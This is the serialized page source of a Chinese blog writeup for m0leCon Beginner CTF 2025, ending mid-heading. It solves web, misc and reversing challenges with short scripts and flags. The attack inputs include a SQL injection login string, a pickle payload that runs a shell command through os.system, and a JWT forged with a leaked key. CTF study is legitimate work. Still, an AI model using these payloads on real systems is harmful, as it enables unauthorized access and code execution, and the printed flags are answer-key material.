2:I[55329,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-fa632c1349770315.js","548","static/chunks/548-617600d488b129da.js","877","static/chunks/app/%5B...slug%5D/page-c055ea9888416fd7.js"],""]
3:I[86510,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-fa632c1349770315.js","548","static/chunks/548-617600d488b129da.js","877","static/chunks/app/%5B...slug%5D/page-c055ea9888416fd7.js"],"PostMeta"]
4:"$Sreact.suspense"
6:I[30389,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-fa632c1349770315.js","548","static/chunks/548-617600d488b129da.js","877","static/chunks/app/%5B...slug%5D/page-c055ea9888416fd7.js"],""]
7:I[5613,[],""]
9:I[31778,[],""]
a:I[25694,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-832d9b697ba819a6.js"],"GlobalProvider"]
b:I[30397,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-832d9b697ba819a6.js"],""]
8:["slug","24d/wp-m0lecon-2025","c"]
0:["5OJUqVj6x1bNC-OuxXRYQ",[[["",{"children":[["slug","24d/wp-m0lecon-2025","c"],{"children":["__PAGE__?{\"slug\":[\"24d\",\"wp-m0lecon-2025\"]}",{}]}]},"$undefined","$undefined",true],["",{"children":[["slug","24d/wp-m0lecon-2025","c"],{"children":["__PAGE__",{},["$L1",[["$","$L2",null,{}],["$","div",null,{"id":"post-layout","children":[false,["$","div",null,{"id":"main","className":"center-wrapper","children":[["$","h1",null,{"className":"post-title","children":"m0leCon Beginner CTF 2025 Writeup"}],["$","$L3",null,{"path":"/24d/wp-m0lecon-2025/"}],["$","$4",null,{"fallback":["$","p",null,{"children":"Loading component..."}],"children":"$L5"}]]}],["$","$L6",null,{}]]}]],null]]},["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","$8","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/9687af492632970b.css","precedence":"next","crossOrigin":""}]]}]]},[null,["$","html",null,{"lang":"zh-CN","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}],["$","script",null,{"async":true,"src":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"}],["$","script",null,{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nwindow.dataLayer = window.dataLayer || [];\nfunction gtag() {\n    dataLayer.push(arguments);\n}\ngtag('js', new Date());\ngtag('config', 'G-45BYSZ6WPY');\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"const a=z=>h.getItem(z),b=(y,z)=>h.setItem(y,z),c=(y,z)=>document.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e&&a(d)!==f&&b(d,f);a(d)===e?c(g,e):c(g,f);"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nif (!Array.prototype.findLast) {\n    Array.prototype.findLast = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return this[i];\n        }\n        return undefined;\n    };\n}\nif (!Array.prototype.findLastIndex) {\n    Array.prototype.findLastIndex = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return i;\n        }\n        return -1;\n    };\n}\n"}}]]}],["$","body",null,{"children":["$","$La",null,{"children":[["$","$Lb",null,{}],["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"id":"notfound","children":[["$","img",null,{"alt":"img","src":"/images/cry.gif"}],["$","code",null,{"id":"notfound-404","children":"404"}],["$","code",null,{"id":"notfound-text","children":"Page Not Found"}]]}],"notFoundStyles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/98e601cf5ba3633d.css","precedence":"next","crossOrigin":""}]],"styles":null}]]}]}]]}],null]],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/9dc17cfeb42615f9.css","precedence":"next","crossOrigin":""}]],"$Lc"]]]]
d:I[74365,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-fa632c1349770315.js","548","static/chunks/548-617600d488b129da.js","877","static/chunks/app/%5B...slug%5D/page-c055ea9888416fd7.js"],""]
e:I[62029,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-fa632c1349770315.js","548","static/chunks/548-617600d488b129da.js","877","static/chunks/app/%5B...slug%5D/page-c055ea9888416fd7.js"],""]
f:T768,<span class="token keyword">import</span> requests
<span class="token keyword">import</span> jwt

url <span class="token operator">=</span> <span class="token string">"https://gosecureit.challs.m0lecon.it/flag"</span>

payload <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
    <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">"schrody_is_always_watching"</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>

resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"jwt"</span><span class="token punctuation">:</span> token<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token comment"># ptm{Th4t'5_why_1t'5_c4ll3d_53cr3t?}</span>
10:T6b9,p<span class="token punctuation">,</span> q <span class="token operator">=</span> <span class="token number">9962676558042353381</span><span class="token punctuation">,</span> <span class="token number">16839954032773686901</span>
cipher <span class="token operator">=</span> <span class="token number">45538264661765883251026503237437838586</span>

e <span class="token operator">=</span> <span class="token number">65537</span>

n <span class="token operator">=</span> p <span class="token operator">*</span> q
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
msg <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>  <span class="token comment"># 99004462</span>

<span class="token comment"># ptm{iT_1s_d17fiCu1t_t0_uNl0ck_4_d00r}</span>
11:T14df,<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HIWORD</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
<span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i32<span class="token punctuation">;</span>
i32 <span class="token function">myhash</span><span class="token punctuation">(</span>i32 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    i32 v2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">793289518</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">793289518</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1 <span class="token operator">^</span> <span class="token function">HIWORD</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">793289518</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1 <span class="token operator">^</span> <span class="token function">HIWORD</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">HIWORD</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> target<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1554755408</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i32 test<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">;</span>test<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>test<span class="token operator">%</span><span class="token number">100000000</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> cout<span class="token operator">&lt;&lt;</span>test<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">==</span><span class="token function">myhash</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            cout<span class="token operator">&lt;&lt;</span>test<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">// 733394619</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    cout<span class="token operator">&lt;&lt;</span><span class="token string">"Done."</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// ptm{my_s3cr3t_i5_th4t_1_l0v3_c4t5}</span>
12:T496,import javax.crypto.*;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class Test {
    private static final String IV = "TXdESVBYeWc1dldkbHNFaQ==";
    private static final String Key = "YWYwYjAyYjkzNmRhZjU3Yg==";
    private static final String Output = "XZdGZ7pi9Ih4wHL/8Mj0q8/o6i/utS2tIsigHXCaEzpTXgesqtnLNJMbagqYH67ut9dbxhXC28w=";

    public static String decrypt() throws Exception {
        Base64.Decoder decoder = Base64.getDecoder();
        SecretKey secretKey = new SecretKeySpec(decoder.decode(Key), "AES");
        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, decoder.decode(IV));
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, secretKey, gcmParameterSpec);
        byte[] decryptedData = cipher.doFinal(decoder.decode(Output));
        return new String(decryptedData);
    }

    public static void main(String[] args) throws Exception {
        String decryptedData = decrypt();
        System.out.println("Decrypted Data: " + decryptedData);
    }
}

// Decrypted Data: ptm{th3nk_y0u_f0r_r3st0r1ng_mY_m3ss4g3!}
13:T1e03,<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">GCMParameterSpec</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">SecretKeySpec</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">IV</span> <span class="token operator">=</span> <span class="token string">"TXdESVBYeWc1dldkbHNFaQ=="</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token class-name">Key</span> <span class="token operator">=</span> <span class="token string">"YWYwYjAyYjkzNmRhZjU3Yg=="</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token class-name">Output</span> <span class="token operator">=</span> <span class="token string">"XZdGZ7pi9Ih4wHL/8Mj0q8/o6i/utS2tIsigHXCaEzpTXgesqtnLNJMbagqYH67ut9dbxhXC28w="</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">Base64<span class="token punctuation">.</span>Decoder</span> decoder <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">SecretKey</span> secretKey <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>decoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token class-name">Key</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">GCMParameterSpec</span> gcmParameterSpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GCMParameterSpec</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> decoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token constant">IV</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES/GCM/NoPadding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token constant">DECRYPT_MODE</span><span class="token punctuation">,</span> secretKey<span class="token punctuation">,</span> gcmParameterSpec<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decryptedData <span class="token operator">=</span> cipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>decoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token class-name">Output</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>decryptedData<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> decryptedData <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Decrypted Data: "</span> <span class="token operator">+</span> decryptedData<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Decrypted Data: ptm{th3nk_y0u_f0r_r3st0r1ng_mY_m3ss4g3!}</span>
14:T1dc9,<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np

A0 <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x558</span><span class="token punctuation">,</span> <span class="token number">0x6EC</span><span class="token punctuation">,</span> <span class="token number">0x629</span><span class="token punctuation">,</span> <span class="token number">0x600</span><span class="token punctuation">,</span> <span class="token number">0x53F</span><span class="token punctuation">,</span> <span class="token number">0x4A9</span><span class="token punctuation">,</span> <span class="token number">0x40F</span><span class="token punctuation">,</span> <span class="token number">0x538</span><span class="token punctuation">,</span>
    <span class="token number">0x604</span><span class="token punctuation">,</span> <span class="token number">0x748</span><span class="token punctuation">,</span> <span class="token number">0x4EF</span><span class="token punctuation">,</span> <span class="token number">0x3F1</span><span class="token punctuation">,</span> <span class="token number">0x4E9</span><span class="token punctuation">,</span> <span class="token number">0x76D</span><span class="token punctuation">,</span> <span class="token number">0x407</span><span class="token punctuation">,</span> <span class="token number">0x42F</span><span class="token punctuation">,</span>
    <span class="token number">0x58A</span><span class="token punctuation">,</span> <span class="token number">0x7CB</span><span class="token punctuation">,</span> <span class="token number">0x69C</span><span class="token punctuation">,</span> <span class="token number">0x5FD</span><span class="token punctuation">,</span> <span class="token number">0x532</span><span class="token punctuation">,</span> <span class="token number">0x74A</span><span class="token punctuation">,</span> <span class="token number">0x429</span><span class="token punctuation">,</span> <span class="token number">0x653</span><span class="token punctuation">,</span>
    <span class="token number">0x762</span><span class="token punctuation">,</span> <span class="token number">0x6B5</span><span class="token punctuation">,</span> <span class="token number">0x574</span><span class="token punctuation">,</span> <span class="token number">0x758</span><span class="token punctuation">,</span> <span class="token number">0x479</span><span class="token punctuation">,</span> <span class="token number">0x6FE</span><span class="token punctuation">,</span> <span class="token number">0x547</span><span class="token punctuation">,</span> <span class="token number">0x77D</span><span class="token punctuation">,</span>
    <span class="token number">0x4EE</span><span class="token punctuation">,</span> <span class="token number">0x601</span><span class="token punctuation">,</span> <span class="token number">0x6D4</span><span class="token punctuation">,</span> <span class="token number">0x55F</span><span class="token punctuation">,</span> <span class="token number">0x787</span><span class="token punctuation">,</span> <span class="token number">0x420</span><span class="token punctuation">,</span> <span class="token number">0x661</span><span class="token punctuation">,</span> <span class="token number">0x625</span><span class="token punctuation">,</span>
    <span class="token number">0x44B</span><span class="token punctuation">,</span> <span class="token number">0x7A2</span><span class="token punctuation">,</span> <span class="token number">0x646</span><span class="token punctuation">,</span> <span class="token number">0x668</span><span class="token punctuation">,</span> <span class="token number">0x541</span><span class="token punctuation">,</span> <span class="token number">0x699</span><span class="token punctuation">,</span> <span class="token number">0x7C0</span><span class="token punctuation">,</span> <span class="token number">0x593</span><span class="token punctuation">,</span>
    <span class="token number">0x436</span><span class="token punctuation">,</span> <span class="token number">0x62F</span><span class="token punctuation">,</span> <span class="token number">0x5E3</span><span class="token punctuation">,</span> <span class="token number">0x668</span><span class="token punctuation">,</span> <span class="token number">0x507</span><span class="token punctuation">,</span> <span class="token number">0x459</span><span class="token punctuation">,</span> <span class="token number">0x4FB</span><span class="token punctuation">,</span> <span class="token number">0x706</span><span class="token punctuation">,</span>
    <span class="token number">0x5EE</span><span class="token punctuation">,</span> <span class="token number">0x421</span><span class="token punctuation">,</span> <span class="token number">0x6A7</span><span class="token punctuation">,</span> <span class="token number">0x6A0</span><span class="token punctuation">,</span> <span class="token number">0x66A</span><span class="token punctuation">,</span> <span class="token number">0x5FC</span><span class="token punctuation">,</span> <span class="token number">0x781</span><span class="token punctuation">,</span> <span class="token number">0x4BA</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>A0<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 64</span>

A <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>A0<span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x24755BA</span><span class="token punctuation">,</span> <span class="token number">0x238FFE7</span><span class="token punctuation">,</span> <span class="token number">0x28CC2B2</span><span class="token punctuation">,</span> <span class="token number">0x2B017EC</span><span class="token punctuation">,</span> <span class="token number">0x278F0B0</span><span class="token punctuation">,</span> <span class="token number">0x295FE1C</span><span class="token punctuation">,</span> <span class="token number">0x2500092</span><span class="token punctuation">,</span> <span class="token number">0x27D1441</span><span class="token punctuation">]</span>
x <span class="token operator">=</span> np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>A<span class="token punctuation">,</span> b<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># ptm{sm7_s0lv3r5_c4n_b3_m4g1c4l}</span>
5:[["$","$Ld",null,{"src":"overview.jpg","width":"100%"}],["$","h2",null,{"className":"x-h1","children":"Web"}],["$","h3",null,{"className":"x-h2","children":"Cookie Shop"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"直接改cookie就可以，控制台输入<code class=\"x-inline-highlight\">btoa('{\"balance\": 99999}')</code>可以拿到要修改为的值。"}}],["$","h3",null,{"className":"x-h2","children":"Go SecureIt"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"JWT密钥泄露。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import requests\nimport jwt\n\nurl = \"https://gosecureit.challs.m0lecon.it/flag\"\n\npayload = {\n    \"username\": \"admin\",\n    \"role\": \"admin\",\n}\n\ntoken = jwt.encode(payload, \"schrody_is_always_watching\", algorithm=\"HS256\")\nprint(token)\n\nresp = requests.get(url, cookies={\"jwt\": token})\nprint(resp.text)\n\n# ptm{Th4t'5_why_1t'5_c4ll3d_53cr3t?}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$f"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Locked Door"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"查看元素看到跳转到<code class=\"x-inline-highlight\">/xugpuhru</code>的按钮有<code class=\"x-inline-highlight\">disabled</code>属性，把它移除再点击，或手动跳转。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"在Previous Accesses页面，用<code class=\"x-inline-highlight\">1' or 1=1 --</code>登录可以下载<code class=\"x-inline-highlight\">.pcap</code>文件，从文件内容看到需要做一个RSA解密。由于<code class=\"x-inline-highlight\">n</code>比较小，可以直接借助<a href=\"https://sagecell.sagemath.org/\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">Sage</a>分解。解密后的<code class=\"x-inline-highlight\">8</code>位数字就是密码。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"p, q = 9962676558042353381, 16839954032773686901\ncipher = 45538264661765883251026503237437838586\n\ne = 65537\n\nn = p * q\nphi = (p - 1) * (q - 1)\nd = pow(e, -1, phi)\nmsg = pow(cipher, d, n)\n\nprint(msg)  # 99004462\n\n# ptm{iT_1s_d17fiCu1t_t0_uNl0ck_4_d00r}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$10"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"Misc"}],["$","h3",null,{"className":"x-h2","children":"Pickle Soup"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import base64\n\npayload = b'''\\\n(S'cat *.txt'\nios\nsystem\n.'''\n\npayload = base64.b64encode(payload)\nprint(payload)  # b'KFMnY2F0ICoudHh0Jwppb3MKc3lzdGVtCi4='\n\n# ptm{Th3_s3cr3t_1ngr3di3nt_w3re_th3_fri3nds_w3_m4de_4l0ng_th3_w4y}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">import</span> base64\n\npayload <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">b'''\\\n(S'cat *.txt'\nios\nsystem\n.'''</span>\n\npayload <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># b'KFMnY2F0ICoudHh0Jwppb3MKc3lzdGVtCi4='</span>\n\n<span class=\"token comment\"># ptm{Th3_s3cr3t_1ngr3di3nt_w3re_th3_fri3nds_w3_m4de_4l0ng_th3_w4y}</span>\n"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"Reversing"}],["$","h3",null,{"className":"x-h2","children":"Susculator"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"数据规模不大，可以直接爆破。满足条件的结果不唯一。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C++"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"#include <iostream>\n#define HIWORD(x) (((x) >> 16) & 0xFFFF)\nusing namespace std;\ntypedef unsigned int i32;\ni32 myhash(i32 a1)\n{\n    i32 v2 = -793289518 * ((-793289518 * (a1 ^ HIWORD(a1))) ^ ((-793289518 * (a1 ^ HIWORD(a1))) >> 16));\n    return HIWORD(v2) ^ v2;\n}\nint main()\n{\n    int target=-1554755408;\n    for(i32 test=0;;test++)\n    {\n        if(test%100000000==0) cout<<test<<endl;\n        if(target==myhash(test))\n        {\n            cout<<test<<endl; // 733394619\n            break;\n        }\n    }\n    cout<<\"Done.\";\n    return 0;\n}\n\n// ptm{my_s3cr3t_i5_th4t_1_l0v3_c4t5}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$11"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Droid Cryptor"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"用Java写出对应的解密逻辑即可："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Java"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$12"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$13"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Magical 